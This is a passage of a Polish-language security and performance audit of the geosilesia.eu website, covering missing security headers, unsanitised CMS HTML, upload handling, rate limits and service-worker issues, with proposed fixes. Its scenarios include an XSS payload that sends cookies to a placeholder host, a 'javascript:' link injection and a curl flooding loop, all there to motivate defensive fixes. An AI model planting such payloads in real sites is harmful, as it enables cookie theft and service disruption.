# Audyt geosilesia.eu — działanie, wydajność, bezpieczeństwo

Data: 2026-11-27. Stan kodu: `master` @ `19ab215`. Produkcja (geosilesia.eu) działa na tym samym
buildzie (`main-7RPYLJEZ.js` w moim buildzie i na produkcji). Audyt niczego nie zmienia w kodzie.

**Status poprawek (branch `fix/audit-top5`):** B1, B2, B3 (bez PDF), B4, B5, B6, B7, D1, D2, D3, D4,
D5, W1, W3 — wprowadzone, jeszcze nie wdrożone. `script-src` jest w trybie Report-Only (raporty
w logu serwera jako `[csp]`). Otwarte: B8, W2, P2 (poza kodem) oraz D6, P1 (zostają celowo bez
zmian). Przy B7: 7 markerów ma w CMS błędny link (`ttp:`, `ttps:`, adres zamiast URL) — przycisk
„Szczegóły” się przy nich nie pokazuje. P2 dotyczy teraz też `localStorage`
(`geosilesia:appDataAt`, data ostatniego prefetchu). Statystyki (jedyne zapisy do bazy z publicznej
strony): odrzucane żądania z innych stron (`Sec-Fetch-Site`/`Origin`), deduplikacja `view`
(10 s), zdarzenia tylko dla istniejących stron i z poprawnym celem, limit 500 zapisów dziennie
na odwiedzającego. W1: prefetch `/api/appData` tylko w zainstalowanej aplikacji (PWA), najwyżej raz
na dobę.

## 0. Rozpoznanie (co potwierdziłem, co poprawiam)

| Założenie | Stan w kodzie |
|---|---|
| Frontend Angular | Tak, Angular 22 (`front/`), komponenty standalone, wszystkie `OnPush`. |
| Serwer Node `app.js` na MyDevil (Passenger) | Tak. Express 4.22.3 + MongoDB driver 4.17. Na produkcji widać `server: nginx` + `x-powered-by: Phusion Passenger`. |
| SSR / prerender / SPA | **SSR na żądanie** (`RenderMode.Server`), bez prerenderu. `app.js` woła `render()` z `front/src/server.ts` przez `ssr.js`, cache HTML w pamięci 1 h, czyszczony po zmianie wersji treści. Hydracja przyrostowa (`@defer … hydrate on viewport`). |
| Treści z CMS (`typeData`) | Tak. CMS (frodo, osobne repo) pisze wprost do MongoDB. Serwis czyta kolekcje `pages`, `posts`, `files`, `meta`. Treści idą do szablonów przez `ApiService` → TransferState, a HTML z CMS przez dyrektywę `[appHtml]`. |
| Panel administracyjny | **Nie ma go w tym repo.** Serwis nie ma endpointów zapisu treści. Jedyny endpoint zapisu to `POST /api/visit-event` (statystyki). Panelu CMS nie audytowałem. |
| Service worker i manifest PWA | Tak, `@angular/service-worker` (`front/ngsw-config.json`) + `front/public/manifest.json`. Odpowiedzi API trafiają do IndexedDB (`idb.service.ts`), nie do cache SW. |
| Fonty lokalne | Tak, Barlow z `@fontsource`, kopiowane do `/fonts`. |
| Staging i produkcja | Tak, rozdzielone tylko przez `config.json` (poza gitem). `allowIndexing` domyślnie wyłączone. |
| Działy z mediami | „Do posłuchania”, „Do pooglądania”, „Wirtualne media”, „Mapy online”, „Animacje i prezentacje”, „Do poczytania” to strony z wierszem `knowledge_base`. **Pokazują tylko linki** (`target="_blank" rel="noreferrer"`). Na stagingu w treściach nie ma `<iframe>`, `<audio>`, `<video>`, `<embed>` ani obrazków z obcych domen. Jedyny osadzony zewnętrzny element to **Google Maps** na `/mapa-atrakcji`. |

### Wyniki komend

| Komenda | Wynik |
|---|---|
| `npm audit --omit=dev` (root) | 0 podatności |
| `npm audit --omit=dev` (`front/`) | 0 podatności |
| `npm audit` (`front/`, z dev) | 0 podatności |
| `npx tsc --noEmit -p tsconfig.app.json` | OK, 0 błędów (`strict`, `strictTemplates`) |
| Lint | Brak konfiguracji ESLint — nie uruchomiony |
| `prettier --check` | 125 plików z innym formatowaniem (kwestia stylu, pomijam) |
| Testy | Brak plików `*.spec.ts` i buildera testów w `angular.json` — nie ma czego uruchomić |
| `ng build --stats-json` (do katalogu tymczasowego) | OK. Initial: `main` 424,8 kB (114 kB transfer), `styles` 90,6 kB (13 kB). Biblioteki map (`@googlemaps/markerclusterer`, `supercluster`, `kdbush`) są w leniwym chunku `search-map` (58 kB). Brak source map w buildzie produkcyjnym. |

Dodatkowo (tylko odczyt): zapytania do bazy stagingu (`mo1309_geo_stg`) o typy wierszy, domeny w
treściach i znaczniki HTML, oraz zapytania `GET`/`HEAD` do produkcji o nagłówki.

---

## 1. Podsumowanie

Kod jest w dobrym stanie: zależności bez znanych CVE, typy bez błędów, wszystkie komponenty
`OnPush`, subskrypcje z `takeUntilDestroyed`, trasy leniwe, statyka z hashem cache'owana na rok,
kompresja brotli działa, 404 zwraca status 404, a staging nie może trafić do Google
(`allowIndexing` domyślnie wyłączone, `robots.txt` generowany dynamicznie, `config.json` poza gitem).

Najważniejsze ryzyka:

1. **Serwer nie wysyła żadnych nagłówków bezpieczeństwa** (brak HSTS, CSP, `X-Content-Type-Options`,
   ochrony przed osadzaniem w ramce, `Referrer-Policy`). Potwierdzone na produkcji.
2. **HTML z CMS omija sanityzację** (pipe `trusted` w 13 komponentach), a SSR wysyła go każdemu.
   Bez CSP każdy, kto zapisze treść w CMS lub w bazie, może uruchomić skrypt u wszystkich odwiedzających.
3. **Pliki z `/uploads` (w tym SVG) są serwowane z domeny serwisu** bez `nosniff` i bez sandboxa.
4. **Endpoint `/img/<frame>/<x>-<y>/…` przyjmuje 10 201 pozycji × 4 szerokości dla każdego zdjęcia**,
   a konwersje stoją w jednej nieograniczonej kolejce. Łatwo zapchać CPU i dysk, a wtedy zwykłe
   miniatury też czekają.
5. **Po deployu użytkownicy mogą zostać na starej wersji aplikacji** (brak obsługi `SwUpdate`),
   a stare leniwe chunki są kasowane od razu, więc karty otwarte bez SW tracą wiersze `@defer`.
6. **Błąd połączenia z Mongo przy starcie jest trwały** — serwis odpowiada 503/powłoką aż do restartu.
7. **Każde pełne wejście na stronę uruchamia prefetch `/api/appData`** (2,4 MB JSON, 491 kB po brotli
   przy pierwszej wizycie), a serwer za każdym razem buduje całą odpowiedź od nowa.

---

## 2. Tabela znalezisk

| ID | Obszar | Priorytet | Pewność | Plik:linia | Opis | Nakład |
|---|---|---|---|---|---|---|
| B1 | Bezpieczeństwo | Wysoki | potwierdzone (kod + produkcja) | `app.js:15-30` | Brak nagłówków bezpieczeństwa (HSTS, CSP, nosniff, frame-ancestors, Referrer-Policy, Permissions-Policy); jest `X-Powered-By: Express`. | S (bez CSP) / M (CSP) |
| B2 | Bezpieczeństwo | Średni | potwierdzone | `front/src/app/shared/trusted.pipe.ts:17` | HTML z CMS przechodzi przez `bypassSecurityTrustHtml` w 13 komponentach i trafia do HTML z SSR bez sanityzacji. | S–M |
| B3 | Bezpieczeństwo | Średni | potwierdzone | `app.js:716` | `/uploads` serwuje SVG/HTML/PDF inline z domeny serwisu, bez `nosniff` i bez sandboxa. | S |
| B4 | Bezpieczeństwo / dostępność | Średni | potwierdzone | `images.js:117-135`, `images.js:148-153` | Kadry `/img/<frame>/<x>-<y>/<w>/…`: 10 201 pozycji × 4 szerokości × każde zdjęcie, jedna nieograniczona kolejka konwersji. | S |
| B5 | Bezpieczeństwo | Średni | potwierdzone | `app.js:289-327`, `app.js:340-347`, `app.js:260` | Brak limitów żądań: `POST /api/visit-event` zapisuje do Mongo bez limitu, `/api/appData` buduje 2,4 MB na każde żądanie, nagłówek `X-Page-View` można podrobić. | S–M |
| B6 | Bezpieczeństwo | Niski | prawdopodobne | `app.js:811-824` | Handler błędów zwraca `err.message` (np. treść błędu Mongo) ze statusem 422 zamiast 500. | S |
| B7 | Bezpieczeństwo | Niski | potwierdzone | `front/src/app/core/map.service.ts:278-279` | Link „Szczegóły” w karcie mapy dostaje `href` z CMS przez DOM API, bez sanityzacji URL (`javascript:` zadziała). | S |
| B8 | Bezpieczeństwo | Niski | do sprawdzenia | `app.js:53-57` | Serwis łączy się z bazą, w której CMS trzyma `users` i `sessions`; nie wiadomo, czy konto ma tylko potrzebne uprawnienia. | S |
| D1 | Działanie | Średni | potwierdzone | `front/src/app/app.config.ts:79-82` | Brak obsługi `SwUpdate` (`versionUpdates`, `unrecoverable`): PWA i długo otwarte karty zostają na starej wersji. | S |
| D2 | Działanie | Średni | potwierdzone | `deploy.sh:44-47` | Deploy od razu kasuje poprzedni build; karty bez aktywnego SW dostają 404 na leniwe chunki wierszy `@defer`. | S |
| D3 | Działanie | Średni | potwierdzone | `app.js:69-73`, `app.js:88-94` | Nieudane połączenie z Mongo przy starcie ustawia `databaseError` na stałe; serwis zwraca 503 aż do restartu. | S |
| D4 | Działanie | Średni | prawdopodobne | `front/src/app/core/page.resolver.ts:43-47` | Resolver nie łapie błędów IndexedDB; błąd IDB (np. Safari po uśpieniu karty) blokuje nawigację. | S |
| D5 | Działanie | Niski | prawdopodobne | `front/public/manifest.json:47`, `front/ngsw-config.json:8` | `start_url: "/index.html"`: PWA z ekranu głównego startuje bez SSR, a offline nie startuje wcale. | S |
| D6 | Działanie / prywatność | Niski | potwierdzone | `front/src/app/components/search-map/search-map.ts:296-303` | Adres `?lokalizacja=moja` pyta o geolokalizację od razu przy wejściu, bez kliknięcia. | S |
| W1 | Wydajność | Średni | potwierdzone (produkcja) | `front/src/app/app.ts:80-108`, `app.js:340-347` | Prefetch `/api/appData` na każdym pełnym wejściu: 491 kB (br) przy pierwszej wizycie, pełne budowanie odpowiedzi na serwerze za każdym razem. | S–M |
| W2 | Wydajność / SEO | Niski | potwierdzone (produkcja) | konfiguracja MyDevil | `www.geosilesia.eu` odpowiada 200 zamiast przekierować na `geosilesia.eu`; osobny SW, IndexedDB i prefetch dla tej samej strony. | S |
| W3 | Wydajność | Niski | potwierdzone | `front/src/app/core/map.config.ts:7` | Skrypt Google Maps ładowany bez `loading=async` (Google ostrzega w konsoli, wolniejsze ładowanie). | S |
| P1 | Prywatność | Niski | potwierdzone | `front/src/app/components/row/row.html:13-16`, `search-map.ts:350` | Google Maps na `/mapa-atrakcji` ładuje się bez akcji użytkownika. Polityka prywatności to opisuje; ewentualnie „kliknij, aby wczytać mapę”. | M |
| P2 | Prywatność | Niski | potwierdzone | `front/src/app/core/idb.service.ts:39`, `front/src/app/core/scroll-restoration.ts:8` | Polityka prywatności nie wspomina o zapisie w przeglądarce (IndexedDB ~2,4 MB treści, Cache Storage SW, sessionStorage). | S |

---

## 3. Szczegóły

### B1. Brak nagłówków bezpieczeństwa

**Dowód.** W `app.js` nie ma `helmet` ani żadnego `res.set` dla nagłówków bezpieczeństwa. Jedyne
ustawiane nagłówki to `X-Robots-Tag`, `X-Render`, `Link`, `Retry-After`, `Cache-Control`.

```js
// app.js:15-30
const app = express();
app.set("port", process.env.PORT || 3000);
app.set("trust proxy", 1);
app.use(compression());
```

Produkcja (`curl -D - https://geosilesia.eu/`):

```
HTTP/2 200
server: nginx
content-type: text/html; charset=utf-8
x-powered-by: Express
x-render: ssr-hit
x-powered-by: Phusion Passenger(R)
```

Brak: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`,
`X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`. Przekierowanie
http → https robi nginx (301), ale bez HSTS pierwsze żądanie po `http://` jest niechronione.

**Scenariusz.** (a) Użytkownik w publicznej sieci Wi-Fi wpisuje `geosilesia.eu` bez `https://` —
pierwsze żądanie idzie otwartym tekstem i można je podmienić (SSL stripping). (b) Każde XSS z B2/B3
działa bez żadnej bariery, bo nie ma CSP. (c) Strona może być osadzona w ramce na obcej domenie.

**Wpływ.** Brak drugiej linii obrony; ujawniona technologia serwera.

**Poprawka.** Dodać middleware przed trasami (bez nowej zależności):

```js
app.disable("x-powered-by");
app.use((req, res, next) => {
    res.set({
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "X-Content-Type-Options": "nosniff",
        "Referrer-Policy": "strict-origin-when-cross-origin",
        "Permissions-Policy": "camera=(), microphone=(), payment=(), geolocation=(self)",
        "X-Frame-Options": "SAMEORIGIN",
        // Na start tylko dyrektywy, które niczego nie psują:
        "Content-Security-Policy": "frame-ancestors 'self'; object-src 'none'; base-uri 'self'"
    });
    next();
});
```

Pełne `script-src` wymaga pracy (M): w `index.html` jest skrypt inline (`MutationObserver`,
`index.html:100-131`), SSR wstawia skrypt event replay, a krytyczny CSS ładuje się przez `onload`.
Proponuję najpierw `Content-Security-Policy-Report-Only` z hashami skryptów inline i domenami Google
Maps, a dopiero potem tryb wymuszający. `includeSubDomains` tylko jeśli wszystkie subdomeny mają HTTPS
(do sprawdzenia).

### B2. HTML z CMS omija sanityzację

**Dowód.**

```ts
// front/src/app/shared/trusted.pipe.ts:13-18
transform(html: unknown): SafeHtml | unknown {
    if (!html || typeof html !== 'string') { return html; }
    return this.sanitizer.bypassSecurityTrustHtml(html);
}
```

```ts
// front/src/app/shared/html.directive.ts:44-47
const value = (this.appHtml() ?? '') as SafeHtml | string;
const html = withSrcset(this.sanitizer.sanitize(SecurityContext.HTML, value) ?? '', …);
this.renderer.setProperty(this.element, 'innerHTML', html);
```

`sanitize()` przepuszcza `SafeHtml` bez zmian. Pipe jest użyty m.in. w `top50.html:35`,
`title-and-text.html:13-35`, `page-hero.html:41,89`, `notice.html:9,22,46`, `news.html:12,51`,
`knowledge-base.html:6,32`, `numbered-list.html:9,20,53`, `link-cards.html:25,41`,
`gallery.html:33`, `gallery-list.html:5`, `contact.html:28`. Wyjątek: `marker-category-list.html:17`
(bez `trusted`, więc sanityzowany).

**Scenariusz.** Ktoś przejmuje konto edytora w CMS (albo dostęp do Mongo — ta sama baza, patrz B8)
i wpisuje w opis przystanku TOP 50: `<img src=x onerror="fetch('https://zly.example/?c='+document.cookie)">`.
Serwer renderuje to do HTML (SSR), zapisuje w cache na godzinę i wysyła każdemu. Front zapisuje
treść w IndexedDB, więc skrypt działa także offline, do następnego prefetchu.

**Wpływ.** Stored XSS u wszystkich odwiedzających; podmiana treści, przekierowania, phishing.
Ryzyko zależy od zaufania do kont CMS, ale nie ma CSP, które by to ograniczyło.

**Poprawka.** Na stagingu treści nie zawierają `<script>`, `<iframe>`, atrybutów `on*`, `style=`,
`id=` ani `class=` (sprawdziłem w bazie). Jest tylko 13× `target=` — wbudowany sanitizer Angulara go
przepuszcza. Można więc usunąć `| trusted` ze wszystkich szablonów (dyrektywa `appHtml` sama
sanityzuje) i usunąć pipe. Przed tym porównać wyrenderowany HTML kilku stron przed i po (np. przez
`X-Render` i diff HTML). SSR też korzysta z sanitizera, więc serwer przestanie wysyłać niebezpieczny HTML.

### B3. Pliki z `/uploads` serwowane inline z domeny serwisu

**Dowód.**

```js
// app.js:716
app.use("/uploads", express.static(`${__dirname}/uploads`, { maxAge: "1d" }));
```

W lokalnej kopii `uploads/` jest 10 plików SVG, 8 PDF. Produkcja:
`GET /uploads/kategoria-wodne.svg` → `200`, `content-type: image/svg+xml`, bez `X-Content-Type-Options`
i bez CSP. Obecne pliki SVG są czyste (bez `<script>` i `on*=`).

**Scenariusz.** Przez CMS ktoś wgrywa `ikona.svg` ze `<script>`. Link `https://geosilesia.eu/uploads/ikona.svg`
otwarty bezpośrednio uruchamia skrypt w domenie serwisu: ma dostęp do IndexedDB i Cache Storage
serwisu i może wysyłać żądania jako ta strona. To samo dotyczy pliku `.html`, jeśli CMS go przyjmie.

**Wpływ.** XSS z poziomu pliku; zależy od tego, jakie typy plików przyjmuje CMS (do sprawdzenia).

**Poprawka.** Dla `/uploads` dodać nagłówki:

```js
app.use("/uploads", (req, res, next) => {
    res.set("X-Content-Type-Options", "nosniff");
    res.set("Content-Security-Policy", "default-src 'none'; img-src 'self'; style-src 'unsafe-inline'; sandbox");
    next();
}, express.static(…));
```

`sandbox` w CSP blokuje skrypty w SVG/HTML otwartych bezpośrednio, a `<img src="…svg">` dalej działa.

### B4. Kadry obrazów: nieograniczona liczba wariantów i kolejka

**Dowód.**

```js
// images.js:148-153
const match = /^(\d{1,3})-(\d{1,3})$/.exec(position ?? "");
…
return x <= 100 && y <= 100 ? { name, ratio: FRAMES[name], x, y } : null;
```

```js
// images.js:127-133
if (!pending.has(target)) {
    const job = queue.then(() => convert(source, target, width, frame));
    queue = job.catch(() => undefined);
    pending.set(target, job);
```

Każda para `x-y` (101 × 101) × 4 szerokości × ~1 900 zdjęć to osobna konwersja i osobny plik w
`tmp/img-cache`. Kolejka nie ma limitu długości ani czasu.

**Scenariusz.** Skrypt wysyła po kolei `/img/hero-phone/0-0/400/foto.jpg`, `/img/hero-phone/0-1/400/foto.jpg`, …
Każde żądanie dokłada konwersję wasm-vips (setki ms CPU i dziesiątki MB RAM). Kolejka rośnie bez końca,
więc zwykłe miniatury (`/img/800/…`) odwiedzających czekają na swoją kolej minutami, a dysk się zapełnia.
Hosting może ubić proces za pamięć.

**Wpływ.** Spowolnienie lub niedostępność obrazów i całego procesu Node.

**Poprawka.** (1) Akceptować tylko pozycje, które są w CMS (lista kadrów z banera strony głównej),
albo zaokrąglać `x`, `y` do wielokrotności 10. (2) Limit długości kolejki: przy np. > 20 zadaniach od
razu oddawać oryginał (`res.sendFile(source)`) zamiast czekać. (3) Opcjonalnie limit żądań na IP (B5).

### B5. Brak limitów żądań na ciężkich i zapisujących endpointach

**Dowód.**

```js
// app.js:289-292
app.post("/api/visit-event", bodyParser.text({ type: "*/*", limit: "2kb" }), (req, res) => {
```

```js
// app.js:340-344
app.get("/api/appData/", (req, res, next) => {
    Promise.all([
        collections.pages.find({}).toArray().then(attachGalleries),
        collections.posts.find({}).toArray()
```

```js
// app.js:260
if (req.get("x-page-view") !== "1") return;
```

**Scenariusz.** (a) Pętla `curl -X POST /api/visit-event -d '{"type":"engagement","path":"/x","ms":1000}'`
z przeglądarkowym User-Agentem dodaje tysiące dokumentów do `visit_events` (każdy dzień nowy „gość”)
i fałszuje statystyki w CMS. To samo z `GET /api/page/... -H "X-Page-View: 1"`. (b) Równoległe żądania
`/api/appData` — każde czyta 2 500 postów, 81 stron, ~53 zapytania o pliki i serializuje 2,4 MB.

**Wpływ.** Zafałszowane statystyki, rosnąca baza, obciążenie CPU/Mongo.

**Poprawka.** Prosty licznik w pamięci (mapa IP → liczba żądań w oknie 1 min) dla `/api/visit-event`,
`/api/appData` i `/img`; po przekroczeniu `429`. Dla `/api/appData` cache odpowiedzi (patrz W1) usuwa
większość kosztu.

### B6. Handler błędów ujawnia komunikaty i zwraca 422

**Dowód.**

```js
// app.js:811-817
app.use((err, req, res, next) => {
    console.log(err);
    console.log(err.message);
    if (typeof err === "string") {
        res.status(422).send({ error: err });
    } else if (typeof err.message === "string") {
        res.status(422).send({ error: err.message });
```

**Scenariusz.** Mongo przestaje odpowiadać w trakcie żądania `/api/posts/marker` → klient dostaje
`422 {"error":"connection … to mongo21.mydevil.net:27017 closed"}` (nazwa hosta bazy) zamiast 503.
Błędny JSON w `POST` z `Content-Type: application/json` → 422 z komunikatem parsera.
(Zniekształcone `%`-kodowanie zwraca już 400 — sprawdzone na produkcji.)

**Wpływ.** Ujawnienie szczegółów infrastruktury; zły status dla błędów serwera (front i crawlery
traktują 4xx jako błąd klienta).

**Poprawka.** Logować pełny błąd, a klientowi zwracać `res.status(err.status || 500).send({ error: "Internal error" })`;
`err.status` z body-parsera (400/413) zostawić.

### B7. `href` z CMS w karcie mapy bez sanityzacji URL

**Dowód.**

```ts
// front/src/app/core/map.service.ts:277-281
if (model.hyperlink) {
    const details = el('a', 'btn btn--primary', 'Szczegóły') as HTMLAnchorElement;
    details.href = model.hyperlink;
    details.target = '_blank';
```

Przypisanie przez DOM API omija sanitizer URL Angulara (który działa dla `[href]` w szablonie,
np. `search-map.html:245`).

**Scenariusz.** W markerze w CMS pole linku ma `javascript:alert(document.domain)`. Kliknięcie
„Szczegóły” w dymku na mapie (desktop) wykonuje kod. (W Chrome `target=_blank` z `javascript:` bywa
blokowane, w innych przeglądarkach różnie.)

**Wpływ.** Niski — wymaga zapisu w CMS i kliknięcia.

**Poprawka.** Przepuszczać tylko `http:`/`https:`:
`if (/^https?:\/\//i.test(model.hyperlink)) details.href = model.hyperlink;`

### B8. Wspólna baza i konto z CMS

**Dowód.** Baza stagingu zawiera kolekcje `users`, `sessions`, `settings`, `counters`, `components`
obok `pages`, `posts`, `files`. Serwis łączy się `config.mongoUrl` (`app.js:53`), a skrypty CMS
(`scripts/cms/lib.js:47`) tym samym URL-em zapisują dane — więc to konto ma prawo zapisu.

**Scenariusz.** Błąd w `app.js` pozwalający wykonać dowolne zapytanie (dziś takiego nie znalazłem:
parametry z adresu trafiają do zapytań tylko jako stringi) dałby dostęp do haseł/sesji CMS.

**Poprawka.** Osobny użytkownik Mongo dla serwisu: `read` na `pages`, `posts`, `files`, `meta`;
`insert` na `visits`, `visit_events`; `update` na `meta` (sól). Skrypty CMS dalej na koncie z zapisem.

### D1. Brak obsługi aktualizacji service workera

**Dowód.** W `front/src/` nie ma `SwUpdate`, `versionUpdates` ani `unrecoverable` (grep: 0 wyników).

```ts
// front/src/app/app.config.ts:79-82
provideServiceWorker('ngsw-worker.js', {
    enabled: !isDevMode(),
    registrationStrategy: 'registerWhenStable:30000'
})
```

**Scenariusz.** Użytkownik ma GeoSilesię jako PWA na telefonie (iOS trzyma aplikację w pamięci dniami).
Deploy zmienia kształt danych w CMS (np. skrypty `scripts/cms/32-*`, `33-*` zmieniają pola, a stary
front ich nie czyta). Stara wersja z cache SW pobiera nowe dane z API i pokazuje puste lub zepsute sekcje,
aż użytkownik zamknie wszystkie karty. Gdy SW wejdzie w stan „unrecoverable” (np. brak pliku z
manifestu na serwerze), aplikacja nie przeładuje się sama.

**Wpływ.** Zepsute strony u części użytkowników po każdym deployu ze zmianą danych.

**Poprawka.** W `App` (w `afterNextRender`):

```ts
const updates = inject(SwUpdate);
if (updates.isEnabled) {
    updates.versionUpdates.pipe(filter(e => e.type === 'VERSION_READY'))
        .subscribe(() => this.reloadOnNextNavigation = true); // przeładuj przy następnej nawigacji
    updates.unrecoverable.subscribe(() => location.reload());
}
```

Przeładowanie przy następnej nawigacji (zamiast od razu) nie przerywa czytania.

### D2. Deploy kasuje stare chunki od razu

**Dowód.**

```sh
# deploy.sh:43-47
if [ -d front/dist/geosilesia ]; then
    mv front/dist/geosilesia tmp/front-old
fi
mv tmp/front-build front/dist/geosilesia
rm -rf tmp/front-old
```

**Scenariusz.** (a) Ktoś otworzył stronę 10 s przed deployem — SW jeszcze się nie zarejestrował
(`registerWhenStable:30000`). Po deployu przewija w dół: wiersz `@defer (hydrate on viewport)` prosi o
`chunk-XXXX.js` ze starego buildu → `404` (serwer zwraca powłokę HTML 404). Wiersz zostaje bez
interakcji (np. zakładki, galeria, filtr wydarzeń nie reagują), a przy nawigacji w aplikacji nie
renderuje się wcale. (b) Między `mv` a `devil www restart` stary proces ma w cache HTML z SSR
z odnośnikiem do starego `main-*.js`, którego już nie ma.

**Wpływ.** Martwe sekcje u osób, które miały stronę otwartą w trakcie deployu (bez SW, np. przeglądarki
w trybie prywatnym, pierwsza wizyta).

**Poprawka.** Przed `rm -rf tmp/front-old` skopiować stare `*.js` i `*.css` do nowego
`front/dist/geosilesia/browser/` bez nadpisywania (`cp -n tmp/front-old/browser/*.js tmp/front-old/browser/*.css front/dist/geosilesia/browser/`).
Nie trafią do `ngsw.json`, więc SW ich nie pobiera. Raz na jakiś czas sprzątać pliki starsze niż np. 7 dni.

### D3. Błąd Mongo przy starcie jest trwały

**Dowód.**

```js
// app.js:69-73
.catch(err => {
    databaseError = err;
    console.log(new Date(), err);
    app.listen(app.get("port"), () => console.log("Running on port 3000"));
});
```

```js
// app.js:88-94
app.get("/api*", (req, res, next) => {
    if (databaseError) {
        res.status(503).send({ error: "Resource unavailable" });
```

`databaseError` nigdy nie wraca do `false`, a `collections.*` zostają puste.

**Scenariusz.** Passenger uruchamia proces w chwili, gdy `mongo21.mydevil.net` jest chwilowo
niedostępny (restart bazy, awaria sieci). Baza wraca po minucie, ale proces dalej zwraca 503 na
`/api/*` i powłokę CSR z 503 na każdej stronie — do restartu aplikacji lub do ubicia procesu przez
Passengera po bezczynności.

**Wpływ.** Długa niedostępność po krótkiej awarii bazy; Google widzi 503 na wszystkim.

**Poprawka.** Przy błędzie ponawiać `client.connect()` co np. 10 s (z `setTimeout`), a po sukcesie
ustawić kolekcje i `databaseError = false`. Driver 4.x sam wznawia połączenie, gdy pierwsze się udało.

### D4. Resolver nie łapie błędów IndexedDB

**Dowód.**

```ts
// front/src/app/core/page.resolver.ts:43-47
return from(resource.loadPageFromCache(key)).pipe(
    switchMap(cached =>
        cached ? of(cached) : fromNetwork()
    )
);
```

`loadPageFromCache` → `idb.getPage` → `openDB(...)` może odrzucić Promise. Brak `catchError`.

**Scenariusz.** iPhone, Safari: karta wraca z tła, WebKit zgłasza znany błąd
„Connection to Indexed Database server lost”. Użytkownik klika link w menu → resolver rzuca błąd →
router anuluje nawigację. Nic się nie dzieje, aż do przeładowania strony. To samo przy przepełnionym
miejscu na dysku lub uszkodzonej bazie.

**Wpływ.** Nawigacja w aplikacji przestaje działać w tej karcie.

**Poprawka.** `from(resource.loadPageFromCache(key)).pipe(catchError(() => of(undefined)), switchMap(…))`.
Podobnie w `search-map.ts:328-339` i `not-found.service.ts:56` dodać `.catch(() => [])` (tam błąd jest
tylko nieobsłużonym odrzuceniem, sieć dalej działa).

### D5. `start_url: "/index.html"` w manifeście

**Dowód.**

```json
// front/public/manifest.json:47
"start_url": "/index.html",
```

```json
// front/ngsw-config.json:6-8
"navigationUrls": [
    "/**",
    "!/**/*.*",
```

`/index.html` zawiera kropkę, więc nie jest „nawigacją” dla ngsw, i nie ma go w `assetGroups`
(jest tylko `/index.csr.html`). `app.js:697` oddaje pod tym adresem powłokę CSR.

**Scenariusz.** (a) Użytkownik uruchamia PWA z ekranu głównego bez sieci (np. w terenie, w kopalni) →
SW przepuszcza żądanie do sieci → ekran błędu przeglądarki zamiast strony z IndexedDB. (b) Z siecią
start zawsze idzie przez powłokę CSR, bez SSR — wolniejsze pierwsze malowanie.

**Wpływ.** Offline, główna zaleta PWA, nie działa przy starcie z ikony.

**Poprawka.** `"start_url": "/"` (i najlepiej `"scope": "/"`). Pewność „prawdopodobne”: wniosek z
konfiguracji ngsw; trzeba potwierdzić w Chrome (DevTools → Application → offline + start z ikony).

### D6. Geolokalizacja z parametru w adresie

**Dowód.**

```ts
// front/src/app/components/search-map/search-map.ts:296-303
effect(() => {
    const location = this.pendingLocation();
    if (!this.mapsReady() || !this.markersCount() || !location) return;
    untracked(() => {
        this.pendingLocation.set(undefined);
        if (location === 'moja') {
            this.useMyLocation();
```

**Scenariusz.** Ktoś udostępnia link `https://geosilesia.eu/mapa-atrakcji?lokalizacja=moja`
(albo użytkownik odświeża stronę po kliknięciu „Moja lokalizacja”). Po wejściu przeglądarka od razu
pyta o lokalizację, bez kliknięcia na tej stronie.

**Wpływ.** Niski; prośby o zgodę bez akcji użytkownika obniżają zaufanie, a Chrome może je wyciszać.

**Poprawka.** Dla `moja` z adresu przy pełnym wejściu pokazać przycisk „Użyj mojej lokalizacji”
zamiast wołać `getCurrentPosition` (automatycznie tylko po nawigacji wewnątrz aplikacji).

### W1. Prefetch `/api/appData` przy każdym wejściu

**Dowód.**

```ts
// front/src/app/app.ts:64, 88-101
this.schedulePrefetch(view);
…
const prefetch = () => this.resource.prefetchAppData();
const onLoad = () => { timer = setTimeout(() => { … prefetch … }, PREFETCH_DELAY_MS); };
```

`schedulePrefetch` biegnie przy każdym starcie aplikacji (każde pełne wejście, nie raz dziennie).
Produkcja: `/api/appData` = 2 376 120 B surowo, 491 044 B brotli; drugie żądanie z `If-None-Match`
dostaje `304` (ETag Expressa), ale serwer i tak buduje całe 2,4 MB, żeby policzyć ETag.

**Scenariusz.** Osoba z Google wchodzi na telefonie na jeden artykuł. 5 s po załadowaniu pobiera
491 kB danych, których może nigdy nie użyć (offline). Każde wejście każdej osoby to po stronie serwera
pełny odczyt 2 500 postów + 81 stron + ~53 zapytania o pliki.

**Wpływ.** Transfer na mobile, obciążenie serwera i bazy proporcjonalne do ruchu.

**Poprawka.** (1) Serwer: trzymać gotowy JSON `/api/appData` w pamięci, kluczem jest
`contentVersion` (już odpytywane co 5 s, `app.js:395`), i ustawiać `ETag: "v<version>"` bez budowania
odpowiedzi. (2) Front: zapisać w IndexedDB wersję/datę ostatniego prefetchu i pomijać go, jeśli był
w ciągu np. 24 h; opcjonalnie prefetch dopiero przy drugiej wizycie lub w zainstalowanej PWA.

### W2. `www.geosilesia.eu` bez przekierowania

**Dowód.** `curl -D - https://www.geosilesia.eu/` → `HTTP/2 200`, `x-render: ssr-hit`; canonical
w HTML wskazuje `https://geosilesia.eu/` (dobrze).

**Scenariusz.** Użytkownik raz wejdzie przez `www`, raz bez — dwa osobne originy: dwa SW, dwie bazy
IndexedDB, dwa prefetchy po 491 kB, osobne cache przeglądarki.

**Poprawka.** W panelu MyDevil (lub w `app.js`) 301 z `www.geosilesia.eu` na `geosilesia.eu`.

### W3. Google Maps bez `loading=async`

**Dowód.**

```ts
// front/src/app/core/map.config.ts:7
export const GOOGLE_MAPS_URL = `https://maps.googleapis.com/maps/api/js?key=${GOOGLE_MAPS_KEY}`;
```

**Scenariusz.** Na `/mapa-atrakcji` konsola pokazuje ostrzeżenie Google o ładowaniu bez `loading=async`;
biblioteka ładuje się synchronicznym trybem bootstrapu.

**Poprawka.** `…/js?key=…&loading=async&callback=…` (Google wymaga wtedy `callback`) albo
dynamiczny import przez `importLibrary`. Sprawdzić `isLoaded()` (`map.service.ts:59-64`) po zmianie.

### P1. Google Maps ładuje się bez akcji użytkownika

**Dowód.** Wiersz `map` (strona `mapa-atrakcji`) to `@defer (on immediate; hydrate on interaction; hydrate on viewport)`
(`row.html:13-16`). Po hydratacji `ngOnInit` pobiera markery i woła `loadGoogleMaps()` (`search-map.ts:350`).
Mapa jest na górze strony, więc ładuje się zaraz po wejściu. Polityka prywatności (strona
